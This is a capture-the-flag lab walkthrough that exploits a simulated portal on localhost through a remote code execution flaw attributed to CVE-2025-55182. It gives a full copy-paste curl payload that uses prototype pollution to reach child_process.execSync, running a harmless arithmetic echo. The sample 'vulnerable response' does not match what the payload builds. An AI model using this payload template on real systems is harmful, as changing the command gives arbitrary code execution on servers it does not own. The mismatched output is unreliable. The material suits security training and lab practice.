# 🚩 CTF Walkthrough: Exploiting CVE-2025-55182

This guide describes how to manually exploit the **CorpSecure Portal** (simulated vulnerable target) using `curl`. This demonstrates Remote Code Execution (RCE) via blind mathematical injection.

---

## 🏗️ 1. Setup

Start the CTF challenge target:

```bash
cd ctf_challenge
docker-compose up --build
```
Target is now live at: `http://localhost:5555`

---

## 💥 2. The Exploit (Manual)

We will inject a command into the Server Action processing logic. Specifically, we will ask the server to calculate `1337 * 2`.

Copy and paste this command into your terminal:

```bash
curl -i -X POST http://localhost:5555/ \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW" \
  -d $'------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\\"$B1337\\\"}","_response":{"_prefix":"var res=process.mainModule.require(\'child_process\').execSync(\'echo $((1337*2))\').toString().trim();;throw Object.assign(new Error(\'NEXT_REDIRECT\'),{digest:`NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n'
```

---

## 🏆 3. Verification (The Flag)

Look at the **Response Headers** in your terminal output.

**Vulnerable Response:**
```http
HTTP/1.1 303 See Other
X-Powered-By: Express
X-Action-Redirect: /dashboard?session=2674&admin=true
Location: /dashboard?session=2674
...
```

### Why is this RCE?
The server executed `echo $((1337*2))`, calculated `2674`, and returned it in the HTTP Header. We controlled the server's execution logic! 🚀
